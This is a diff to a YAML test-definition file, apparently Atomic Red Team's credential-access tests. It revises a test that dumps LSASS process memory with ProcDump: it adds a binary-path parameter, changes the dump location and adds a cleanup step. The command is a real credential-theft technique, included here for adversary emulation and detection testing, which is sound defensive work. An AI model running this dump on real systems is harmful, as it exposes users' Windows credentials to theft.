@@ -19491,14 +19491,19 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
+        procdump_binary_path:
+          description: Path of the ProcDump binary
+          type: string
+          default: "$PathToAtomicsFolder\\T1003\\bin\\procdump64.exe"
         output_file:
           description: Path where resulting dump should be placed
           type: Path
-          default: lsass_dump.dmp
+          default: C:\Windows\Temp\lsass_dump.dmp
       executor:
         elevation_required: true
         name: command_prompt
-        command: 'procdump.exe -accepteula -ma lsass.exe #{output_file}
+        command: "#{procdump_binary_path} -accepteula -ma lsass.exe #{output_file}\n"
+        cleanup_command: 'rm "#{output_file}"
 
 '
     - name: Dump LSASS.exe Memory using Windows Task Manager
